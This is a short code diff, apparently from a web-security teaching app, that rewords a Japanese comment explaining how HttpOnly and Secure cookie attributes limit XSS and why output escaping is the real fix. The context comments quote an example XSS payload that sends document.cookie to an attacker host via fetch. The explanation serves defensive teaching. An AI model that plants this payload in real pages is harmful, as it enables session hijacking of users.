@@ -113,7 +113,7 @@ export const createApp = () => {
   // HttpOnly 属性で Cookie へのアクセスを、 Secure 属性で Cookie の盗聴を防ぐ
   //   リクエストに Cookie を乗せるわけではなく、直接奪取しているため SameSite 属性では防げない
   // 抜本対応は表示内容をエスケープすること
-  //   上記の方法で Cookie の対策はできても、それ以外のスクリプトは実行できてしまう
+  //   上記の方法でセッションハイジャックの対策はできても、それ以外のスクリプトは実行できてしまう
   // 例) 昔の掲示板等でよくあった手法である
   //   Cookie を取得して送信したり
   //   `<script>fetch("https://hacker.com/steal?cookie="+document.cookie);</script>`
